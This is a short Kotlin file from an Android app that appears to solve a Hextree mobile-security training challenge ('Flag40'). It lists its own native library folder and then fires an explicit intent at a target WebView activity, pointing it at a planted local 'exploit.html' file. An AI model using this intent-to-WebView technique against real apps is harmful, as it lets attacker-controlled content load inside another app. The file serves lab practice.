package com.pachinko.intentattacksurface.utils

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.util.Log
import java.nio.file.Files
import kotlin.io.path.Path
import kotlin.io.path.listDirectoryEntries

object Flag40 {
    fun getFlag(context: Context) {
        val location = context.applicationInfo.nativeLibraryDir
        Log.d("Flag40", "nativeLibDir: $location")
        val files = Path(location).listDirectoryEntries()
        files.forEach {
            Log.d("Flag40", "iterator: ${it.toString()}")
        }
        val intent = Intent().apply {
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.webviews.Flag40WebViewsActivity"
            )
            putExtra("URL", "file://$location/exploit.html")
        }
        context.startActivity(intent)
    }
}